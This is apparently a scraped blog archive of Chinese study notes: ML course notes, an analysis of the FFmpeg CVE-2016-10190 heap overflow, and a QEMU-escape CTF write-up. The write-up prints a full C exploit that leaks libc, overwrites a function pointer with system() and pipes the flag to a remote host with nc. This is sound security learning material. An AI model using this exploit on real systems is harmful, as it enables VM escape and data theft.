2/","link":"","permalink":"https://fuurinko.github.io/2022/09/30/ml_CS%20329P%20|%20note%202/","excerpt":"","text":"​ 0: 胡言乱语1note2，进入模型的学习部分，这一部分似乎并没有涉及太多的代码知识，主要是讲解数学原理。 众所周知md也不好打公式，这一篇水水就过去了。 2: 复习ml算法概述 最简单的决策树概述类似if else的逻辑，将大的数据不断分类，直到达到最小单位（？ 图中演示了两种决策树，左边是用于数据的分类，右边用于数据的回归，但是本质上两者都是一样的。 建立决策树 从根节点开始 对于每个父节点，选择一个特征来划分数据。 决策树的局限性 过于复杂的决策树会过拟合数据 决策树对于数据的敏感程度较高 难以进行并行运算 ps：过拟合： 大概指的是衡量模型好坏的两个指标分别是泛化和训练误差。 训练误差指模型对于喂给的数据集的拟合结果的误差，泛化误差指模型对未知数据集的拟合结果的误差， 而衡量泛化的直观表现就是模型是否欠拟合或过拟合。 欠拟合指模型对于训练数据的拟合能力不够，而过拟合指模型过于复杂时，便有些僵硬地只善于反馈训练的数据集，而不会举一反三拟合未知的数据，导致泛化误差变大，也侧面证实了前文中“过于复杂的决策树模型容易导致过拟合。” 随机森林（决策树 pro max）简单来说就是训练多颗决策树，组成森林，并且每个树的训练过程都是独立并行的。 为了提升决策树稳定性，最终训练结果可能是整个随机森林的均值。 随机性随机森林的“随机性”来源于两点 样本bagging 对数据集特征进行采样，挑选出子集用来训练。 bagging值对于一个大的数据集，随机地采样生成新的数据集后用来训练，每一棵树的数据集都是随机生成的新数据集。（比如大的数据集[1,2,3,4,5,6,7]进行随机采样生成随机数据集1[1,1,1,2,3,5,2]，然后用这个生成的数据集喂模型。 Gradient Boosting提升决策树模型的方法之一。 梯度boosting（不好翻译，可能直译就是梯度提升） 用当前训练的n颗树预测n+1颗树的值，并用真实的n+1颗树的值减去前面的预测值得到残差，并在残差上做当前树的训练。 这一块的梯度部分没搞懂。 有点看烦了，去看一点内核题，顺便复习一下dsp，搞完了再来看。","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/categories/Machine-Learning/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/tags/Machine-Learning/"}]},{"title":"CS 329P note1","slug":"ml_CS 329P |  note1","date":"2022-09-29T01:24:04.320Z","updated":"2022-10-24T12:39:54.645Z","comments":true,"path":"2022/09/29/ml_CS 329P |  note1/","link":"","permalink":"https://fuurinko.github.io/2022/09/29/ml_CS%20329P%20|%20%20note1/","excerpt":"","text":"​ 0：胡言乱语由于一些奇怪的原因，半被迫开始学习机器学习。关于学习资料，某位不愿意公开姓名的老同学特别给我推荐了https://www.bilibili.com/video/BV1Xh411p7M9/?spm_id_from=333.788&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564这套课程，说这是他压箱底的宝贝资源。 所以大致记录一下学习过程，第一part的笔记主要针对数据处理部分。 ps：俺是0基础。 1: 内容巩固chapter 1和chapter 2主要针对数据的获取以及简单的处理方式，包括清洗，变换以及特征工程。 ML工作流程 问题分析 （将具体的问题转换为机器学习的问题） -&gt; 收集、处理数据 -&gt; 训练模型 -&gt; 部署模型 （将训练的模型部署到线上）-&gt; 完善数据 （递归） 2:例子演示走一遍课程中提到的代码。 课程提供的代码以及数据集在https://c.d2l.ai/stanford-cs329p/assignments.html#assignment-1 环境python3.9 macosx。 安装相关依赖。（其实我也不记得安装了啥依赖，反正缺啥就pip3 instal 1pip3 install numpy pandas autogluon mxnet --upgrade ps：之前我用py脚本写，然后在zsh上运行这个： 123456789101112131415from dataclasses import dataclassimport pandas as pdimport numpy as npimport scipyimport matplotlib.pyplot as pltimport seaborn as snsfrom IPython import displayimport pyarrowmatplotlib_inline.set_matplotlib_formats(&#x27;svg&#x27;)#data = pd.read_feather(&#x27;house_sales.ftr&#x27;)#ab = (data[])data = pd.read_feather(&#x27;house_sales.ftr&#x27;)data.shapedata.head() 结果是终端没有任何回显，如果是在vscode的终端中运行会报错 听说是pyarrow包有问题，但是我浅显地搜了一下并没有很好的解决办法。 此路不通，但可以换一条。 直接在终端用IPython的话是可以的，但是相对来说比较麻烦，需要一条一条命令输。不知道有没有其他好方法（为什么外国人这么喜欢用ipython，之前pwn college的那个tutor也是用ipython）。 注意就是，assignment给的是ftr文件，我大概搜了一下也是一种文件储存的压缩形式，但是需要用pandas 的 read_feather来读取。 于是显示效果就是这样，和视频里没有太大的区别。 12345678910111213141516In [12]: data = pd.read_feather(&#x27;house_sales.ftr&#x27;)In [13]: data.shapeOut[13]: (164944, 1789)In [14]: data.head()Out[14]: Id Address Sold Price ... Tax Legal Tract Number Building Name Zip0 2080183300 11205 Monterey, $2,000,000 ... None None 950461 20926300 5281 Castle Rd, $2,100,000 ... None None 910112 19595300 3581 Butcher Dr, $1,125,000 ... None None 950513 300472200 2021 N Milpitas Blvd, $36,250,000 ... None None 950354 2074492000 LOT 4 Tool Box Spring Rd, $140,000 ... None None 92561[5 rows x 1789 columns] 到这里为止还都是些猴子都能理解的简单操作。 稍微看一下pandas的官方文档。https://pandas.pydata.org/docs/user_guide/index.html#user-guide 大致是一个很好用的数据处理分析软件，只要有数据基本什么分析都能完成。 比如说我们刚刚用到的shape方法。 就是返回一个tuple（元组，可以理解为一个表）的列和行数。 head()方法就是现实n行的数据（n默认为5）。 挺有意思的，可以看到我们显示的行和视频不太一样，中间有很多项被省略了，我发现这个和终端窗口大小有关，窗口越宽显示的东西越多。那有没有什么办法能让它全部显示呢。 https://blog.csdn.net/weekdawn/article/details/81389865这篇文章有解释。 1234567891011121314In [37]: data.dtypesOut[37]: Id objectAddress objectSold Price objectSold On objectSummary object ... Tax Legal Lot Number objectTax Legal Block Number objectTax Legal Tract Number objectBuilding Name objectZip objectLength: 1789, dtype: object 可以看到这个数据集非常牛逼，所有项的类型都是object。 3:作业大致看了一下，作业给出的数据集内容和课程里的内容差别还是有的，其中给出的任务也不太一样。 作业的任务大致是 用更多的数据进行模型训练 数据类型转换 数据清理 找往年的数据进行训练。 作业的说明给出了大致的（以上几点）的代码，但是所有的清理包括训练仅有“Sold Price”一项，而作业要求我们使用更多的项来训练。 但是在拓展之前，先研究一下怎么实现。 数据清理首先依然是导入包，读取数据集。 12345import pandas as pdimport numpy as npimport scipydata = pd.read_feather(&#x27;house_sales.ftr&#x27;)df = data[[&#x27;Sold Price&#x27;, &#x27;Sold On&#x27;, &#x27;Type&#x27;, &#x27;Year built&#x27;, &#x27;Bedrooms&#x27;, &#x27;Bathrooms&#x27;]].copy() 先不管作业的要求，取这些数据出来用作模型训练。 然后是简单的数据处理 12345c = &#x27;Sold Price&#x27;if c in df.select_dtypes(&#x27;object&#x27;).columns: df.loc[:,c] = np.log10( pd.to_numeric(df[c].replace(r&#x27;[$,-]&#x27;, &#x27;&#x27;, regex=True)) + 1)df = df[(df[&#x27;Sold Price&#x27;] &gt;= 4 ) &amp; (df[&#x27;Sold Price&#x27;] &lt;= 8 )] 因为不太熟悉pands，所以一些方法的使用得一点一点查。 首先是df.select_dtypes 返回参数指定类型的列表。 例如这里返回数据集中所有object 类型的数据。 12345678910111213141516In [10]: df.select_dtypes(&#x27;object&#x27;)Out[10]: Type Year built Bedrooms Bathrooms0 SingleFamily No Data 2 2.01 SingleFamily 1951 3 3.02 SingleFamily 1954 3 2.03 Apartment 1989 0 0.04 VacantLand No Data None None... ... ... ... ...164939 Condo 1991 2 2.0164940 Condo 2009 3 3.0164941 Condo 2019 2 None164942 SingleFamily 1973 4 3.0164943 SingleFamily 1949 4 2.0[160839 rows x 4 columns] 所以这里if c in df.select_dtypes(&#39;object&#39;).columns:指每个object类型列中的‘Sold Price’元素。 df.loc 返回由label标的行列数据。 12345678910111213141516171819In [13]: df.loc[1]Out[13]: Sold Price 6.32222Sold On 2021-02-25 00:00:00Type SingleFamilyYear built 1951Bedrooms 3Bathrooms 3.0Name: 1, dtype: objectIn [14]: df.loc[2]Out[14]: Sold Price 6.051153Sold On 2019-11-06 00:00:00Type SingleFamilyYear built 1954Bedrooms 3Bathrooms 2.0Name: 2, dtype: object df.loc[:,c]表示取出列表中所有行列项中含c的部分。即打印所有&#39;Sold Price&#39; 1234567891011121314In [12]: df.loc[:,c]Out[12]: 0 6.3010301 6.3222202 6.0511533 7.5593084 5.146131 ... 164939 5.750915164940 6.423246164941 6.132580164942 6.146128164943 5.352184Name: Sold Price, Length: 160839, dtype: float64 np.log10 这里又是包numpy的方法了。官方文档：https://numpy.org/doc/stable/reference/generated/numpy.log10.html 比较简单易懂，返回log10。 1np.log10(pd.to_numeric(df[c].replace(r&#x27;[$,-]&#x27;, &#x27;&#x27;, regex=True)) + 1) pd.to_numeric 转换为数字类型。根据提供的数据转换为float64或int64。 转换的数据df[c].replace(r&#39;[$,-]&#39;, &#39;&#39;, regex=True) 前一项为要替换的值，后一项为替换后的值，这里就是把所有空项或者带¥符号带项删去。 然后留下log10(SoldPrice)在四到八之间的值，其他被视为噪音。 接着 123456test_start, test_end = pd.Timestamp(2021, 2, 15), pd.Timestamp(2021, 3, 1)train_start = pd.Timestamp(2021, 1, 1)df[&#x27;Sold On&#x27;] = pd.to_datetime(df[&#x27;Sold On&#x27;], errors=&#x27;coerce&#x27;)train = df[(df[&#x27;Sold On&#x27;] &gt;= train_start) &amp; (df[&#x27;Sold On&#x27;] &lt; test_start)]test = df[(df[&#x27;Sold On&#x27;] &gt;= test_start) &amp; (df[&#x27;Sold On&#x27;] &lt; test_end)]train.shape, test.shape 设置时间戳，因为训练需要预测不同时间点的数据， 123def rmsle(y_hat, y): # we already used log prices before, so we only need to compute RMSE return sum((y_hat - y)**2 / len(y))**0.5 没看懂，课程里讲了吗（俺只看到了3.2的三分之一），什么算均方误差？ 然后进行训练。 训练首先引入 from autogluon.tabular import TabularPredictor这个包，用来探测什么模型最适合我们的数据。 12label = &#x27;Sold Price&#x27; predictor = TabularPredictor(label=label).fit(train) 没有什么不好理解的地方吧。 这里测试了很多模型，其中这个模型告诉我Best model: &quot;WeightedEnsemble_L2&quot;。 ps：这个root_mean_squared_error不是在报错，是一个数学指标，中文是均方根误差（吃了没文化的亏 稍微研究一下这个AutoGluon 官方文档：https://auto.gluon.ai/stable/index.html 话说好神奇，我应该是从没有安装过这个包，但是导入的时候也没有报错就运行了。 官方文档没啥好看的，商业宣传用语，来看看log。 1234567891011No path specified. Models will be saved in: &quot;AutogluonModels/ag-20220930_122428/&quot;Beginning AutoGluon training ...AutoGluon will save models to &quot;AutogluonModels/ag-20220930_122428/&quot;AutoGluon Version: 0.5.2Python Version: 3.9.10Operating System: DarwinTrain Data Rows: 24872Train Data Columns: 5Label Column: Sold PricePreprocessing data ...AutoGluon infers your prediction problem is: &#x27;regression&#x27; (because dtype of label-column == float and many unique label-values observed). 因为我的数据都是整数或者浮点，它就自动识别我需要的预测类型为回归。 12Label info (max, min, mean, stddev): (7.546542675816042, 4.000043427276863, 5.75084, 0.39719)If &#x27;regression&#x27; is not the correct problem_type, please manually specify the problem_type parameter during predictor init (You may specify problem_type as one of: [&#x27;binary&#x27;, &#x27;multiclass&#x27;, &#x27;regression&#x27;]) 然后打印了一些值。 并且可以手动修改预测类型。 到这里应该是进行自动的特征工程。 1AutoGluon will gauge predictive performance using evaluation metric: &#x27;root_mean_squared_error&#x27; 用均分根误差来预测。 然后是一些模型的适配。 pps：均方根误差是高数还是概率论的内容。。。 所以它的值是越小越好。（确实那个“最适合”的模型的rmse也是最小的） 其中还会有一些报错，大概还是因为依赖。懒得装了，等什么时候用上再说。 1predictor.leaderboard(test, silent=True) 这一条使数据在每个模型中训练一遍。 预测。 123In [20]: preds = predictor.predict(test.drop(columns=[label])) ...: rmsle(preds, test[label])Out[20]: 0.2798629260751236 no my solution，thanks. 4： 胡言乱语2这一个part主要是介绍了数据处理的流程以及大致的思路，代码量其实不大，也比较简单，熟悉一下pandas就好了。下一个part就涉及到具体的模型了，我浅看了一眼，全是数学，我一个生怕概率论挂科担心了半个寒假的平平无奇的数学废物真的有点害怕。","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/categories/Machine-Learning/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/tags/Machine-Learning/"}]},{"title":"cve-2016-10190分析","slug":"cve-2016-10190","date":"2022-09-14T14:13:10.306Z","updated":"2022-09-29T01:19:47.200Z","comments":true,"path":"2022/09/14/cve-2016-10190/","link":"","permalink":"https://fuurinko.github.io/2022/09/14/cve-2016-10190/","excerpt":"","text":"米版阉割，原文加上代码将近3w字，这里就随便挑一点重点放上来。而且图懒得搞了，就当记录一下。 环境搭建首先下载源码： 1wget https://github.com/FFmpeg/FFmpeg/archive/n3.2.1.tar.gz 4） ffmpeg编译按照https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu，安装编译相关依赖 12345678910111213141516171819202122232425sudo apt-get update -qq &amp;&amp; sudo apt-get -y install \\ autoconf \\ automake \\ build-essential \\ cmake \\ git-core \\ libass-dev \\ libfreetype6-dev \\ libgnutls28-dev \\ libmp3lame-dev \\ libsdl2-dev \\ libtool \\ libva-dev \\ libvdpau-dev \\ libvorbis-dev \\ libxcb1-dev \\ libxcb-shm0-dev \\ libxcb-xfixes0-dev \\ meson \\ ninja-build \\ pkg-config \\ texinfo \\ wget \\ yasm \\ zlib1g-dev 编译:123./configure --prefix=&quot;./build&quot; --bindir=&quot;./bin&quot; \\ --disable-stripping make -j 4 漏洞复现exp1（尝试造成程序崩溃）编写exp1，保存至exp1.py文件。 在ffmpeg可执行文件所在文件夹运行该exp。 1python3 exp1.py 此时再开启一个终端，在相同路径输入命令行： 1./ffmpeg -i http://127.0.0.1:12345 test.avi 可以看到触发程序崩溃。 源码分析源码版本： Ffmpeg 3.2.1 1wget https://github.com/FFmpeg/FFmpeg/archive/n3.2.1.tar.gz 漏洞发生在处理请求的http服务器端的http响应时。 对应代码段如下： libavformat/http.c/:1235 12345678910111213141516171819202122231235 static int http_read_stream(URLContext *h, uint8_t *buf, int size)1236 &#123;//HTTPContext *s结构体含有int64_t字段chunksize，该字段为有符号整数。1250 if (s-&gt;chunksize &gt;= 0) &#123;1251 if (!s-&gt;chunksize) &#123;1252 char line[32];12531254 do &#123;1255 if ((err = http_get_line(s, line, sizeof(line))) &lt; 0)1256 return err;1257 &#125; while (!*line); /* skip CR LF from last chunk */12581259 s-&gt;chunksize = strtoll(line, NULL, 16);1264 if (!s-&gt;chunksize)1265 return 0;1266 &#125;1267 size = FFMIN(size, s-&gt;chunksize);1273 read_ret = http_buf_read(h, buf, size);1295 &#125; 首先需要注意结构体HTTPContext 含有类型为int64_t的字段chunksize，该字段为有符号整数。 11237 HTTPContext *s = h-&gt;priv_data; 接着从http流中读取chunk size，将其储存在上方定义的char类型变量line中。 1234561251 if (!s-&gt;chunksize) &#123;1252 char line[32];12531254 do &#123;1255 if ((err = http_get_line(s, line, sizeof(line))) &lt; 0)1256 return err; 接着使用strtoll函数将line变量转化为long long类型的有符号整数，并保存在s-&gt;chunksize。 11259 s-&gt;chunksize = strtoll(line, NULL, 16); 利用FFMIN函数处理被转化的s-&gt;chunksize。该函数作用是返回两个数中的最小数。 1231267 size = FFMIN(size, s-&gt;chunksize);// #define FFMIN(a,b) ((a) &gt; (b) ? (b) : (a)) 分析知size的初始值为0x8000。通过上文我们得知s-&gt;chunksize作为有符号整数可以表示负数，若此时此变量确为负数，则size恒等于0x8000。 最后调用http_buf_read函数，将size作为参数传入。 11273 read_ret = http_buf_read(h, buf, size); http_buf_read同样被定义在libavformat/http.c 12345671166 static int http_buf_read(URLContext *h, uint8_t *buf, int size)1167 &#123;1168 HTTPContext *s = h-&gt;priv_data;1182 len = ffurl_read(s-&gt;hd, buf, size);1198 &#125; 其中调用了被定义在libavformat/avio.c的ffurl_read函数。 12345407 int ffurl_read(URLContext *h, unsigned char *buf, int size)408 &#123;411 return retry_transfer_wrapper(h, buf, size, 1, h-&gt;prot-&gt;url_read);412 &#125; 可以看到该函数实际调用了retry_transfer_wrapper函数，其中 h-&gt;prot-&gt;url_read是指向函数tcp_read的指针。 tcp_read是定义在libavformat/tcp.c 中的函数。 1234567201 static int tcp_read(URLContext *h, uint8_t *buf, int size)202 &#123;203 TCPContext *s = h-&gt;priv_data;211 ret = recv(s-&gt;fd, buf, size, 0);213 &#125; 由于recv返回一个size_t类型的 len变量，该类型为无符号整数，而被传入的变量size为有符号整数。 例如当该size值为-1， 在ret = recv(s-&gt;fd, buf, size, 0);步骤中，它将会被返回为无符号整数0xffffffffffffffff。 这将导致recv读取远超原本大小为0x8000size的数据进入缓冲区，从而导致堆溢出，若该溢出能够覆盖函数指针，则可能导致RCE成功。 在 Paul Cher的POC中我们可以找到一个位于缓冲区0x8060偏移处的对象AVIOContext。 该对象包含字段 int (*read_packet)(void *, uint8_t *, int);。此字段在函数avio_read中被引用，并且函数将会被程序调用，因此我们可以修改该字段从而实现RCE。 exp分析exp大致逻辑： 输入负数，引发bug 覆盖缓冲区，修改指针，进行栈迁移。 将shellcode写入栈中，并构造rop链调用mprotect函数使栈可执行。 执行shellcode，getshell。 具体就不放了。 8 参考链接https://nandynarwhals.org/cve-2016-10190/ https://paper.seebug.org/253/ https://blog.csdn.net/m0_46687377/article/details/118185115","categories":[{"name":"cve","slug":"cve","permalink":"https://fuurinko.github.io/categories/cve/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://fuurinko.github.io/tags/cve/"}]},{"title":"qemu逃逸学习","slug":"kernel_qemu学习","date":"2022-07-25T07:32:08.971Z","updated":"2022-11-06T14:43:08.983Z","comments":true,"path":"2022/07/25/kernel_qemu学习/","link":"","permalink":"https://fuurinko.github.io/2022/07/25/kernel_qemu%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"因为一些奇怪的原因，开始学一下qemu。 环境准备busybox 基础知识内存结构qemu使用mmap出0x40000000大小的内存作为虚拟机的物理内存，在qemu存在两个转换层，分别是： 用户地址-&gt;物理地址 物理地址-&gt;qemu虚拟地址 具体转换如下： /proc/$pid/pagemap 中储存了当前进程的页表，使得用户空间可以根据页表找到每个虚拟页面映射的物理帧。 通过读取这个页表，就能够实现从用户虚拟地址到物理地址的转换。 例如host为qemu进程分配了0x40000000的虚拟内存空间，地址为 0x7fe37fe00000，通过读取/proc/$pid/pagemap ，将qemu中某个程序的虚拟地址转换为物理地址，返回一个偏移，偏移加上qemu进程的基址则是该程序的真实地址。 pci符合 PCI 总线标准的设备就被称为 PCI 设备。 pci设备通过pci配置空间来指定关于pci设备的特定信息，其中BAR寄存器指定了设备所需要的内存和io空间的大小（也可以用来存放设备寄存器的地址）。pci设备可以申请两类地址空间，包括memory space(MMIO)和I/O space(PMIO) MMIO应用得最为广泛的一种io方法，它使用相同的地址总线来处理内存和io设备 Bit 0：Region Type，总是为 0，用于区分此类型为 Memory Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取 Bits 31-4：Base Address，以 16 字节对齐基址 当cpu访问某个内存地址时，该地址可以是物理内存或io设备的内存，用于访问内存的cpu指令也可来访问io设备。 PMIOio设备与物理内存相互有独立的地址空间。 Bit 0：Region Type，总是为 1，用于区分此类型为 I/O Bit 1：Reserved Bits 31-2：Base Address，以 4 字节对齐基址 cpu需要通过特殊的指令来访问io设备，这些指令可以读/写1,2,4个字节（例如：outb, outw, outl）到IO设备上。 qemu中查看pci设备lspci命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。 例题Blizzard CTF 2017 Strng启动脚本 12345678910./qemu-system-x86_64 \\ -m 1G \\ -device strng \\ -hda my-disk.img \\ -hdb my-seed.img \\ -nographic \\ -L pc-bios/ \\ -enable-kvm \\ -device e1000,netdev=net0 \\ -netdev user,id=net0,hostfwd=tcp::5555-:22 ps:我的环境中kvm有bug，一直报错。直接把-enable-kvm这一条去掉反而可以运行，听说是会大幅降低性能，但是实际测试感觉也没有什么很大问题。 输入账户和密码：ubuntu，passw0rd就能登陆。 然后是对qemu-system-x86_64逆向。 首先在ida中搜索strng函数. 将k的类型设置为PCIDeviceClass * ​ 能看到设备号等信息。 ​ pci_strng_realize 注册了MMIO和PMIO空间。 12345678910111213141516171819void __fastcall pci_strng_realize(PCIDevice_0 *pdev, Error_0 **errp)&#123; memory_region_init_io( (MemoryRegion_0 *)&amp;pdev[1], &amp;pdev-&gt;qdev.parent_obj, &amp;strng_mmio_ops, pdev, &quot;strng-mmio&quot;, 0x100uLL); pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&amp;pdev[1]); memory_region_init_io( (MemoryRegion_0 *)&amp;pdev[1].io_regions[0].size, &amp;pdev-&gt;qdev.parent_obj, &amp;strng_pmio_ops, pdev, &quot;strng-pmio&quot;, 8uLL); pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&amp;pdev[1].io_regions[0].size);&#125; strng_mmio_ops访问了mmio对应的strng_mmio_read以及strng_mmio_write，；strng_pmio_ops中有访问pmio对应的strng_pmio_read以及strng_pmio_write。 strng_mmio_read123456789uint64_t __fastcall strng_mmio_read(void *opaque, hwaddr addr, unsigned int size)&#123; uint64_t result; // rax result = -1LL; if ( size == 4 &amp;&amp; (addr &amp; 3) == 0 ) return *((unsigned int *)opaque + (addr &gt;&gt; 2) + 701); return result;&#125; addr是传入的参数，可以由我们指定。 这里的逻辑应当是 1result = opaque-&gt;regs[addr &gt;&gt; 2]; 即将addr右移两位，作为regs的索引，返回对应的值。 strng_mmio_write当size等于4时，将addr右移两位得到寄存器的索引idx 1234567891011121314151617181920212223if ( size == 4 &amp;&amp; (addr &amp; 3) == 0 )&#123; idx = addr &gt;&gt; 2; if ( idx == 1 )//idx = 1 &#123; *(opaque + 0x2BE) = (*(opaque + 0x180))(opaque, idx, val);// rand() &#125; else if ( idx ) &#123; if ( idx == 3 )//idx = 3 &#123; vala = val; v5 = (*(opaque + 0x181))(opaque + 0xAFC);// rand_r() LODWORD(val) = vala; *(opaque + 0x2C0) = v5; &#125; *(opaque + idx + 0x2BD) = val; //idx = others &#125; else &#123; (*(opaque + 0x17F))(val); //idx = 0 &#125;&#125; ​ 由于我们能够控制addr，所以就能利用其下标对regs[]越界写。 strng_pmio_read123456789101112131415161718192021222324uint64_t __fastcall strng_pmio_read(void *opaque, hwaddr addr, unsigned int size)&#123; uint64_t result; // rax unsigned int v4; // edx result = -1LL; if ( size == 4 ) &#123; if ( addr ) &#123; if ( addr == 4 ) &#123; v4 = *(opaque + 700); if ( (v4 &amp; 3) == 0 ) return *(opaque + (v4 &gt;&gt; 2) + 701); &#125; &#125; else &#123; return *(opaque + 700); &#125; &#125; return result;&#125; 还是当idx为4时，将addr右移两位作为reg的索引，返回regs的值，当idx为0，则直接返回opaque-&gt;addr。 strng_pmio_write123456789101112131415161718192021222324252627282930313233343536373839void __fastcall strng_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; unsigned int v4; // eax __int64 v5; // rax if ( size == 4 ) &#123; if ( addr ) &#123; if ( addr == 4 ) &#123; v4 = *(opaque + 700); if ( (v4 &amp; 3) == 0 ) &#123; v5 = v4 &gt;&gt; 2; if ( v5 == 1 ) &#123; *(opaque + 702) = (*(opaque + 384))(opaque, 4LL, val); &#125; else if ( v5 ) &#123; if ( v5 == 3 ) *(opaque + 704) = (*(opaque + 385))(opaque + 2812, 4LL, val); else *(opaque + v5 + 701) = val; &#125; else &#123; (*(opaque + 383))(val); &#125; &#125; &#125; &#125; else &#123; *(opaque + 700) = val; &#125; &#125;&#125; 逻辑类似mmio write，但索引regs时，mmio时利用了传入的addr，而pmio则是由opaque-&gt;addr索引，而这个值是可控的（端口地址为0时，直接将传入的val赋值给opaque-&gt;addr）。因此我们可以控制它来完成越界读写。 利用首先越界读进行leak，再越界写覆盖rand_r地址为system地址。并触发rand_r实现system(&quot;cat /root/flag&quot;)。 越界读leak当addr为0，传入的val会直接赋值给opaque-&gt;addr。再调用strng_pmio_read，此时regs[val&gt;&gt;2]的值被读取，实现越界读。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;ctype.h&gt;#include &lt;termios.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;#define MAP_SIZE 4096UL#define MAP_MASK (MAP_SIZE - 1)unsigned int pmio_base = 0xc050; // adjust this if different on qemu resetchar* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;;/* oot@ubuntu:/home/ubuntu# cat /sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource 0x00000000febf1000 0x00000000febf10ff 0x0000000000040200 // mmio 0x000000000000c050 0x000000000000c057 0x0000000000040101 // pmio 0x0000000000000000 0x0000000000000000 0x0000000000000000*/void pmio_write(unsigned int val, unsigned int addr) &#123; outl(val, addr);&#125;void pmio_arb_write(unsigned int val, unsigned int offset) &#123; int tmp = offset &gt;&gt; 2; if ( tmp == 1 || tmp == 3) &#123; puts(&quot;PMIO write address is a command&quot;); return; &#125; pmio_write(offset, pmio_base); pmio_write(val, pmio_base + 4);&#125;unsigned int pmio_read(unsigned int offset) &#123; if (offset == 0) &#123; return inl(pmio_base); &#125; pmio_write(offset, pmio_base); return inl(pmio_base + 4);&#125;void mmio_write(unsigned int val, unsigned int offset) &#123; int fd; void *map_base, *virt_addr; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MAP_SIZE &amp; ~MAP_MASK); if(map_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; virt_addr = map_base + (offset &amp; MAP_MASK); *((unsigned int*) virt_addr) = val; if(munmap(map_base, MAP_SIZE) == -1) &#123; perror(&quot;munmap&quot;); exit(-1); &#125; close(fd);&#125;int main(int argc, char* argv[])&#123; if (0 != iopl(3)) &#123; perror(&quot;iopl permissions&quot;); return -1; &#125; unsigned long long _srandom; unsigned long long libc_base; unsigned long long _system; /* &gt;&gt;&gt; map(hex, unpack_many(&quot;cat /root/flag | nc 10.0.2.2 1234 &quot;)) [&#x27;0x20746163&#x27;, &#x27;0x6f6f722f&#x27;, &#x27;0x6c662f74&#x27;, &#x27;0x7c206761&#x27;, &#x27;0x20636e20&#x27;, &#x27;0x302e3031&#x27;, &#x27;0x322e322e&#x27;, &#x27;0x33323120&#x27;, &#x27;0x20202034&#x27;] */ mmio_write(0x6f6f722f, 0xc); mmio_write(0x20746163, 0x8); mmio_write(0x6c662f74, 0x10); mmio_write(0x7c206761, 0x14); mmio_write(0x20636e20, 0x18); mmio_write(0x302e3031, 0x1c); mmio_write(0x322e322e, 0x20); mmio_write(0x33323120, 0x24); mmio_write(0x20202034, 0x28); _srandom = pmio_read(0x108); _srandom &lt;&lt;= 32; _srandom |= pmio_read(0x104); libc_base = _srandom - 0x3a8d0; _system = libc_base + 0x45390; printf(&quot;libc_base: %llx\\n&quot;, libc_base); printf(&quot;_system : %llx\\n&quot;, _system); pmio_arb_write(_system &amp; 0xffffffff, 0x114); // call system ptr mmio_write(0, 0xc); return 0;&#125; 参考https://xz.aliyun.com/t/7345#toc-7 https://www.giantbranch.cn/2020/01/02/CTF%20QEMU%20虚拟机逃逸之HITB-GSEC-2017-babyqemu/?__cf_chl_tk=2N1Wwpu_RNim8qdXIfcgsfWC_W.6dehGZSTasT06KOQ-1658843904-0-gaNycGzNB2U https://xz.aliyun.com/t/6562 https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/ https://blog.csdn.net/yongbaoii/article/details/123824044 https://www.anquanke.com/post/id/254906#h2-7 https://blog.csdn.net/qq_31457355/article/details/117170589","categories":[{"name":"qemu","slug":"qemu","permalink":"https://fuurinko.github.io/categories/qemu/"}],"tags":[{"name":"qemu","slug":"qemu","permalink":"https://fuurinko.github.io/tags/qemu/"}]},{"title":"ucore lab2","slug":"ucore-lab2","date":"2022-07-22T08:31:27.591Z","updated":"2022-07-24T09:14:46.313Z","comments":true,"path":"2022/07/22/ucore-lab2/","link":"","permalink":"https://fuurinko.github.io/2022/07/22/ucore-lab2/","excerpt":"","text":"基础知识系统物理内存探测当操作系统被启动后，需要探测当前内存，了解当下物理内存分布状态。一半探测内存的方式有BIOS中断调用和直接探测两种， 在ucore中，系统选择通过bios调用的INT 15h中断中的e820h中断获取内存信息，并把其映射结构保存在物理地址0x8000处。而这些操作只能在实模式下完成，所以在bootloader进入保护模式前完成这一部分工作比较合适。这些部分由boot/bootasm.S中从probe_memory处到finish_probe处的代码部分完成完成。 BIOS通过系统内存映射地址描述符的格式来表示探测到的系统物理内存布局，并最终将返回值放入到一个保存地址范围描述符结构的缓冲区中，供后续的ucore进一步进行物理内存管理。这个缓冲区结构定义如下： 123456789//kern/mm/memlayout.hstruct e820map &#123; int nr_map; struct &#123; uint64_t addr; uint64_t size; uint32_t type; &#125; __attribute__((packed)) map[E820MAX];&#125;; bootasm.S中对于物理内存探测实现的代码如下： 1234567891011121314151617probe_memory: movl $0, 0x8000 # 对0x8000处对e820结构的成员nr_map清零 xorl %ebx, %ebx # 清空ebx，表示BIOS返回的映射地址描述符的起始地址 movw $0x8004, %di # 将di指向0x8004，也就是e820结构的成员start_probe: movl $0xE820, %eax # INT 15的中断调用参数 movl $20, %ecx # 